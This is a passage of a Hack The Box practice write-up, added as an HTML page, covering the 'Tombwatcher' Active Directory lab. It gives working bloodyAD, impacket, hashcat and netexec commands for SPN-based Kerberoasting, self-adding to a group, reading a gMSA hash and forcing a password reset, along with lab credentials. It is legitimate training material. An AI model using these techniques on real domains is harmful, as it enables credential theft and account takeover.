@@ -1,0 +1,1207 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="Hack The Box practice notes for Tombwatcher by Darrin Jackson.">
+<title>Tombwatcher | Writeups | Darrin Jackson</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site.css">
+
+<style>
+.writeup-tools{display:flex;gap:8px;flex-wrap:wrap;margin-top:18px}
+.writeup-chip{font:600 .68rem/1 var(--mono);padding:7px 9px;border:1px solid var(--line);border-radius:999px;background:var(--panel);color:var(--text-soft)}
+.writeup-back{display:inline-flex;margin-bottom:20px;text-decoration:none;font:600 .75rem/1 var(--mono);color:var(--muted)}
+.writeup-back:hover{color:var(--text)}
+.lab-notes{max-width:900px}
+.lab-notes h1{font-size:1.85rem;letter-spacing:-.025em;margin:44px 0 16px;padding-top:6px}
+.lab-notes h2{font-size:1.35rem;margin:34px 0 13px;padding-top:6px}
+.lab-notes h3{font-size:1.08rem;margin:27px 0 10px}
+.lab-notes h4{font-size:.98rem;margin:22px 0 8px}
+.lab-notes p,.lab-notes li{color:var(--text-soft)}
+.lab-notes ul,.lab-notes ol{padding-left:24px}
+.lab-notes li+li{margin-top:5px}
+.lab-notes hr{border:0;border-top:1px solid var(--line);margin:34px 0}
+.lab-notes pre{overflow:auto;background:#08080a;border:1px solid var(--line);border-radius:7px;padding:16px;font-size:.81rem;line-height:1.55;color:#e3e3e7}
+.lab-notes code{font-family:var(--mono);color:#f2d978}
+.lab-notes pre code{color:inherit}
+.lab-notes table{width:100%;border-collapse:collapse;margin:18px 0 26px;font-size:.88rem;background:var(--panel)}
+.lab-notes th,.lab-notes td{border:1px solid var(--line);padding:9px 11px;text-align:left;vertical-align:top}
+.lab-notes th{font:600 .72rem/1.4 var(--mono);text-transform:uppercase;letter-spacing:.04em;color:var(--text-soft);background:var(--panel-2)}
+.lab-notes blockquote{margin:20px 0;padding:12px 16px;border-left:3px solid var(--purple);background:var(--purple-soft);color:var(--text-soft)}
+.lab-notes blockquote p{margin:0;color:inherit}
+.lab-notes a{color:#cbb8ff;text-underline-offset:3px}
+.source-note{margin:0 0 28px;padding:12px 14px;border:1px solid var(--line);border-radius:7px;background:var(--bg-soft);color:var(--muted);font-size:.85rem}
+@media(max-width:650px){.lab-notes table{display:block;overflow-x:auto}.lab-notes h1{font-size:1.55rem}}
+</style>
+
+</head>
+<body><div class="shell">
+<header class="topbar"><nav class="nav">
+<a class="brand" href="/"><span class="brand-name">Darrin Jackson</span><span class="brand-sub">portfolio</span></a>
+<div class="navlinks"><a data-nav href="/work/">Work</a><a data-nav href="/research/">Writeups</a><a data-nav href="/lab/">Lab</a><a data-nav href="/about/">About</a></div>
+</nav></header>
+<main class="container">
+<a class="writeup-back" href="/research/">← Back to Writeups</a>
+<header class="page-head">
+  <div class="kicker">HTB Practice Lab</div>
+  <h1>Tombwatcher</h1>
+  <p>Original practice notes covering a long Active Directory privilege chain built around delegated permissions, gMSA abuse, object control, and AD CS.</p>
+  <div class="writeup-tools"><span class="writeup-chip">Hack The Box</span><span class="writeup-chip">Windows Active Directory · Medium</span></div>
+</header>
+<div class="source-note">This page is a direct HTML transfer of my original practice notes. The technical content, commands, findings, and attack path have been kept intact rather than rewritten into a different walkthrough.</div>
+<article class="article lab-notes">
+<blockquote>
+<p><strong>Platform:</strong> Hack The Box<br />
+<strong>Difficulty:</strong> Medium<br />
+<strong>Operating System:</strong> Windows Active Directory<br />
+<strong>Primary Topics:</strong> Active Directory ACL Abuse, Kerberoasting, gMSA Abuse, AD Object Ownership, AD CS (ESC15)</p>
+</blockquote>
+<hr />
+<h1 id="machine-information">Machine Information</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Target</td>
+<td><code>10.129.25.96</code></td>
+</tr>
+<tr class="even">
+<td>Domain</td>
+<td><code>tombwatcher.htb</code></td>
+</tr>
+<tr class="odd">
+<td>Hostname</td>
+<td><code>DC01.tombwatcher.htb</code></td>
+</tr>
+<tr class="even">
+<td>Initial User</td>
+<td><code>henry</code></td>
+</tr>
+<tr class="odd">
+<td>Password</td>
+<td><code>H3nry_987TGV!</code></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Note</strong></p>
+<p>The machine rebooted during the assessment and later changed to:</p>
+<p><code>10.129.26.63</code></p>
+</blockquote>
+<hr />
+<h1 id="objectives">Objectives</h1>
+<ul>
+<li>Enumerate exposed services</li>
+<li>Identify Active Directory attack paths</li>
+<li>Abuse delegated ACL permissions</li>
+<li>Escalate privileges through multiple users</li>
+<li>Restore deleted privileged account</li>
+<li>Exploit ADCS ESC15</li>
+<li>Obtain Domain Administrator</li>
+<li>Capture both flags</li>
+</ul>
+<hr />
+<h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="nmap-service-scan">Nmap Service Scan</h2>
+<p>Always begin with a standard service/version scan.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> 10.129.25.96 <span class="dt">\</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>-sV <span class="dt">\</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>-sC <span class="dt">\</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>-A <span class="dt">\</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>-oN nmap.txt</span></code></pre></div>
+<h3 id="interesting-findings">Interesting Findings</h3>
+<table>
+<thead>
+<tr class="header">
+<th>Port</th>
+<th>Service</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>53</td>
+<td>DNS</td>
+<td>Domain Controller DNS</td>
+</tr>
+<tr class="even">
+<td>80</td>
+<td>HTTP</td>
+<td>Microsoft IIS</td>
+</tr>
+<tr class="odd">
+<td>88</td>
+<td>Kerberos</td>
+<td>Active Directory Authentication</td>
+</tr>
+<tr class="even">
+<td>389</td>
+<td>LDAP</td>
+<td>Directory Services</td>
+</tr>
+<tr class="odd">
+<td>445</td>
+<td>SMB</td>
+<td>File Shares</td>
+</tr>
+<tr class="even">
+<td>464</td>
+<td>Kerberos Password Service</td>
+<td></td>
+</tr>
+<tr class="odd">
+<td>636</td>
+<td>LDAPS</td>
+<td>Secure LDAP</td>
+</tr>
+<tr class="even">
+<td>3268</td>
+<td>Global Catalog</td>
+<td></td>
+</tr>
+<tr class="odd">
+<td>3269</td>
+<td>Global Catalog SSL</td>
+<td></td>
+</tr>
+<tr class="even">
+<td>5985</td>
+<td>WinRM</td>
+<td>Potential Remote Shell</td>
+</tr>
+</tbody>
+</table>
+<h3 id="initial-assessment">Initial Assessment</h3>
+<p>Immediately recognizable as a Domain Controller due to:</p>
+<ul>
+<li>DNS</li>
+<li>Kerberos</li>
+<li>LDAP</li>
+<li>Global Catalog</li>
+<li>SMB</li>
+<li>WinRM</li>
+<li>Active Directory certificate</li>
+</ul>
+<hr />
+<h2 id="full-tcp-scan">Full TCP Scan</h2>
+<p>Windows frequently exposes dynamic RPC services.</p>
+<p>Never rely solely on the initial Nmap scan.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> nmap <span class="dt">\</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>-Pn <span class="dt">\</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>-sS <span class="dt">\</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>-p- <span class="dt">\</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>10.129.25.96</span></code></pre></div>
+<p>Additional ports discovered:</p>
+<pre><code>9389
+49666
+49689
+49690
+49692
+49710
+54481
+54496</code></pre>
+<p>Fingerprint the newly discovered ports.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="dt">\</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>-sV <span class="dt">\</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>-sC <span class="dt">\</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>-p9389,49666,49689,49690,49692,49710,54481,54496 <span class="dt">\</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>10.129.25.96</span></code></pre></div>
+<p>Results:</p>
+<table>
+<thead>
+<tr class="header">
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>9389</td>
+<td>.NET Message Framing</td>
+</tr>
+<tr class="even">
+<td>49666</td>
+<td>MSRPC</td>
+</tr>
+<tr class="odd">
+<td>49689</td>
+<td>RPC over HTTP</td>
+</tr>
+<tr class="even">
+<td>49690</td>
+<td>MSRPC</td>
+</tr>
+<tr class="odd">
+<td>49692</td>
+<td>MSRPC</td>
+</tr>
+<tr class="even">
+<td>49710</td>
+<td>MSRPC</td>
+</tr>
+<tr class="odd">
+<td>54481</td>
+<td>MSRPC</td>
+</tr>
+<tr class="even">
+<td>54496</td>
+<td>MSRPC</td>
+</tr>
+</tbody>
+</table>
+<h3 id="notes">Notes</h3>
+<p>Most high-numbered ports are dynamically allocated Windows RPC endpoints.</p>
+<p>These often become useful later during authentication and remote management but generally do not provide an immediate attack surface.</p>
+<hr />
+<h1 id="host-resolution">Host Resolution</h1>
+<p>Before using BloodHound, map the domain locally.</p>
+<pre><code>10.129.25.96    tombwatcher.htb
+10.129.25.96    dc01.tombwatcher.htb</code></pre>
+<hr />
+<h1 id="bloodhound-enumeration">BloodHound Enumeration</h1>
+<p>With valid credentials available, BloodHound becomes the primary enumeration tool.</p>
+<p>Collect data:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodhound-python</span> <span class="dt">\</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>-u henry <span class="dt">\</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;H3nry_987TGV!&#39;</span> <span class="dt">\</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>-ns 10.129.25.96 <span class="dt">\</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>-c All</span></code></pre></div>
+<p>Import the generated ZIP into BloodHound.</p>
+<hr />
+<h1 id="initial-bloodhound-analysis">Initial BloodHound Analysis</h1>
+<h2 id="mindset">Mindset</h2>
+<p>At this stage, stop thinking about machines.</p>
+<p>Start thinking about <strong>permissions</strong>.</p>
+<p>Instead of asking:</p>
+<blockquote>
+<p>"Where can Henry log in?"</p>
+</blockquote>
+<p>Ask:</p>
+<blockquote>
+<p>"What objects can Henry influence?"</p>
+</blockquote>
+<p>BloodHound is significantly more valuable when used to identify privilege relationships rather than simply identifying administrator sessions.</p>
+<hr />
+<h2 id="interesting-edge">Interesting Edge</h2>
+<p>The first meaningful attack path discovered:</p>
+<pre><code>Henry
+      │
+WriteSPN
+      │
+      ▼
+Alfred</code></pre>
+<p>Henry possesses <strong>WriteSPN</strong> over Alfred.</p>
+<p>This immediately becomes the primary avenue for privilege escalation.</p>
+<hr />
+<h1 id="understanding-writespn">Understanding WriteSPN</h1>
+<p>WriteSPN allows modification of a user's Service Principal Names.</p>
+<p>Normally, user accounts do <strong>not</strong> possess SPNs.</p>
+<p>If an attacker can add one:</p>
+<pre><code>Fake SPN
+      │
+      ▼
+Request Service Ticket
+      │
+      ▼
+Kerberos issues TGS
+      │
+      ▼
+Extract Ticket
+      │
+      ▼
+Offline Crack
+      │
+      ▼
+Recover User Password</code></pre>
+<p>This effectively converts an ACL permission into a Kerberoasting opportunity.</p>
+<hr />
+<h1 id="phase-1--henry--alfred">Phase 1 — Henry → Alfred</h1>
+<h2 id="verify-existing-spns">Verify Existing SPNs</h2>
+<p>Before modifying anything, establish a baseline.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>-u henry <span class="dt">\</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;H3nry_987TGV!&#39;</span> <span class="dt">\</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>get object Alfred <span class="dt">\</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>--attr servicePrincipalName</span></code></pre></div>
+<p>Expected output:</p>
+<pre><code>distinguishedName:
+CN=Alfred,CN=Users,DC=tombwatcher,DC=htb</code></pre>
+<p>No SPNs are currently assigned.</p>
+<hr />
+<h2 id="add-fake-spn">Add Fake SPN</h2>
+<p>Assign a fake HTTP service.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>-u henry <span class="dt">\</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;H3nry_987TGV!&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>set object Alfred <span class="dt">\</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>servicePrincipalName <span class="dt">\</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>-v <span class="st">&#39;HTTP/fake.tombwatcher.htb&#39;</span></span></code></pre></div>
+<p>Expected:</p>
+<pre><code>[+] Alfred&#39;s servicePrincipalName has been updated</code></pre>
+<hr />
+<h2 id="verify-modification">Verify Modification</h2>
+<p>Always confirm object changes.</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>-u henry <span class="dt">\</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;H3nry_987TGV!&#39;</span> <span class="dt">\</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>get object Alfred <span class="dt">\</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>--attr servicePrincipalName</span></code></pre></div>
+<p>Output:</p>
+<pre><code>distinguishedName:
+CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
+
+servicePrincipalName:
+HTTP/fake.tombwatcher.htb</code></pre>
+<p>Verification confirms the SPN was successfully assigned.</p>
+<hr />
+<h2 id="request-kerberos-ticket">Request Kerberos Ticket</h2>
+<p>Request a service ticket for the newly created SPN.</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">impacket-GetUserSPNs</span> <span class="dt">\</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>tombwatcher.htb/henry:H3nry_987TGV! <span class="dt">\</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>-dc-ip 10.129.25.96 <span class="dt">\</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>-request <span class="dt">\</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>-outputfile alfred.kb</span></code></pre></div>
+<p>Expected output:</p>
+<pre><code>$krb5tgs$23$*Alfred...</code></pre>
+<hr />
+<h2 id="crack-the-ticket">Crack the Ticket</h2>
+<p>Hashcat mode:</p>
+<pre><code>13100</code></pre>
+<p>Run:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hashcat</span> <span class="dt">\</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>-m 13100 <span class="dt">\</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>alfred.kb <span class="dt">\</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>/usr/share/wordlists/rockyou.txt</span></code></pre></div>
+<p>Recovered credentials:</p>
+<pre><code>Alfred
+basketball</code></pre>
+<hr />
+<h1 id="verification">Verification</h1>
+<p>Confirm the recovered password.</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">netexec</span> ldap <span class="dt">\</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>-u Alfred <span class="dt">\</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>-p basketball</span></code></pre></div>
+<p>Successful authentication confirms valid credentials.</p>
+<hr />
+<h1 id="key-takeaways">Key Takeaways</h1>
+<ul>
+<li>BloodHound identified the attack path before exploitation.</li>
+<li>WriteSPN can be transformed into Kerberoasting.</li>
+<li>Always verify directory modifications.</li>
+<li>Offline cracking avoids interacting further with the target.</li>
+<li>Every newly compromised account should trigger another BloodHound review.</li>
+</ul>
+<hr />
+<h1 id="next-phase">Next Phase</h1>
+<p>Continue BloodHound enumeration using Alfred's credentials.</p>
+<p>The next privilege escalation path begins with:</p>
+<pre><code>Alfred
+    │
+AddSelf
+    │
+Infrastructure</code></pre>
+<h1 id="phase-2--alfred--infrastructure">Phase 2 — Alfred → Infrastructure</h1>
+<h2 id="re-enumerate-bloodhound">Re-Enumerate BloodHound</h2>
+<p>After compromising any new principal, immediately perform another round of BloodHound analysis.</p>
+<p>Do <strong>not</strong> assume the original attack path is still optimal.</p>
+<p>Using Alfred's credentials, BloodHound revealed the following relationship:</p>
+<pre><code>Alfred
+    │
+ AddSelf
+    │
+    ▼
+Infrastructure</code></pre>
+<p>The <strong>Infrastructure</strong> group possesses the <strong>ReadGMSAPassword</strong> privilege over the <code>ANSIBLE_DEV$</code> gMSA account.</p>
+<p>This creates the next privilege escalation path.</p>
+<pre><code>Alfred
+      │
+ AddSelf
+      │
+      ▼
+Infrastructure
+      │
+ReadGMSAPassword
+      │
+      ▼
+ANSIBLE_DEV$</code></pre>
+<hr />
+<h1 id="understanding-addself">Understanding AddSelf</h1>
+<p>The <strong>AddSelf</strong> permission allows a user to add <strong>themselves</strong> as a member of a group.</p>
+<p>While this appears limited compared to GenericAll or GenericWrite, it is often enough to inherit any permissions delegated to that group.</p>
+<p>In this case:</p>
+<pre><code>Alfred
+        │
+AddSelf
+        │
+        ▼
+Infrastructure Group
+        │
+Inherited Permissions
+        │
+        ▼
+ReadGMSAPassword</code></pre>
+<hr />
+<h1 id="verify-current-group-membership">Verify Current Group Membership</h1>
+<p>Before modifying the group, inspect its current members.</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>-u Alfred <span class="dt">\</span></span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;basketball&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a>get object Infrastructure <span class="dt">\</span></span>
+<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a>--attr member</span></code></pre></div>
+<p>Expected output:</p>
+<pre><code>distinguishedName:
+CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb</code></pre>
+<p>No members are currently listed.</p>
+<hr />
+<h1 id="add-alfred-to-infrastructure">Add Alfred to Infrastructure</h1>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a>-u Alfred <span class="dt">\</span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;basketball&#39;</span> <span class="dt">\</span></span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a>add groupMember Infrastructure Alfred</span></code></pre></div>
+<p>Expected:</p>
+<pre><code>[+] Alfred added to Infrastructure</code></pre>
+<hr />
+<h1 id="verify-membership">Verify Membership</h1>
+<p>Always verify successful privilege changes.</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a>-u Alfred <span class="dt">\</span></span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;basketball&#39;</span> <span class="dt">\</span></span>
+<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a>get object Infrastructure <span class="dt">\</span></span>
+<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a>--attr member</span></code></pre></div>
+<p>Expected:</p>
+<pre><code>member:
+CN=Alfred,CN=Users,DC=tombwatcher,DC=htb</code></pre>
+<p>Verification confirms Alfred successfully inherited Infrastructure's permissions.</p>
+<hr />
+<h1 id="phase-3--infrastructure--ansible_dev">Phase 3 — Infrastructure → ANSIBLE_DEV$</h1>
+<h2 id="understanding-gmsas">Understanding gMSAs</h2>
+<p>A <strong>Group Managed Service Account (gMSA)</strong> is a special Active Directory account whose password is automatically managed by the domain.</p>
+<p>Unlike traditional service accounts:</p>
+<ul>
+<li>Passwords are long and randomly generated.</li>
+<li>Password rotation is automatic.</li>
+<li>Administrators never manually know the password.</li>
+</ul>
+<p>Instead, authorized computers or users retrieve the password directly from Active Directory.</p>
+<p>If an attacker gains <strong>ReadGMSAPassword</strong>, they can retrieve the NTLM hash without ever knowing the plaintext password.</p>
+<hr />
+<h1 id="retrieve-the-gmsa-password">Retrieve the gMSA Password</h1>
+<p>NetExec automatically parses the managed password blob.</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">netexec</span> ldap <span class="dt">\</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a>dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a>-u Alfred <span class="dt">\</span></span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;basketball&#39;</span> <span class="dt">\</span></span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a>--gmsa</span></code></pre></div>
+<p>Output:</p>
+<pre><code>ANSIBLE_DEV$
+
+47f92356b62e2b1c7b185df4842b63ad</code></pre>
+<p>This is the NTLM hash for the gMSA account.</p>
+<hr />
+<h1 id="notes-1">Notes</h1>
+<p>Attempting to crack the hash was unsuccessful.</p>
+<p>Given the context of the machine, this strongly suggested the intended attack path was <strong>Pass-the-Hash</strong> rather than password recovery.</p>
+<p>This is common for gMSA accounts because:</p>
+<ul>
+<li>Passwords are extremely long.</li>
+<li>Passwords are randomly generated.</li>
+<li>Offline cracking is generally impractical.</li>
+</ul>
+<hr />
+<h1 id="re-enumerate-bloodhound-1">Re-Enumerate BloodHound</h1>
+<p>Using the recovered gMSA credentials, BloodHound revealed another delegated permission.</p>
+<pre><code>ANSIBLE_DEV$
+        │
+ForceChangePassword
+        │
+        ▼
+Sam</code></pre>
+<p>Rather than requiring GenericAll, the service account only needed permission to reset Sam's password.</p>
+<hr />
+<h1 id="understanding-forcechangepassword">Understanding ForceChangePassword</h1>
+<p>ForceChangePassword allows an attacker to reset another user's password without knowing the current password.</p>
+<p>Unlike password spraying or Kerberoasting:</p>
+<ul>
+<li>No cracking required.</li>
+<li>No interaction from the victim.</li>
+<li>Immediate account takeover.</li>
+</ul>
+<pre><code>ForceChangePassword
+        │
+        ▼
+Reset Password
+        │
+        ▼
+Authenticate as Target</code></pre>
+<hr />
+<h1 id="phase-4--ansible_dev--sam">Phase 4 — ANSIBLE_DEV$ → Sam</h1>
+<p>Reset Sam's password.</p>
+<p>Using the NTLM hash:</p>
+<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a>-u <span class="st">&#39;ANSIBLE_DEV$&#39;</span> <span class="dt">\</span></span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;:47f92356b62e2b1c7b185df4842b63ad&#39;</span> <span class="dt">\</span></span>
+<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a>set password Sam <span class="st">&#39;Password123!&#39;</span></span></code></pre></div>
+<p>Expected:</p>
+<pre><code>[+] Password changed successfully!</code></pre>
+<hr />
+<h1 id="verify-credentials">Verify Credentials</h1>
+<p>Always validate newly obtained credentials.</p>
